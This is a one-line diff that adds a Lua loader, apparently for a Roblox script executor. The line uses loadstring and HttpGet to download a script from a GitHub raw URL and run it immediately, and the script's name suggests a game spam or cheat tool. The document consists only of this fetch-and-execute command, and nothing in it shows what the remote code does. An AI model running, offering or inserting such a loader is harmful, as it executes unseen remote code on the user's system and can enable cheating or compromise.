@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/draw-spells-magic-arena-spam0-amqic0s4jpuxvf.lua"))()
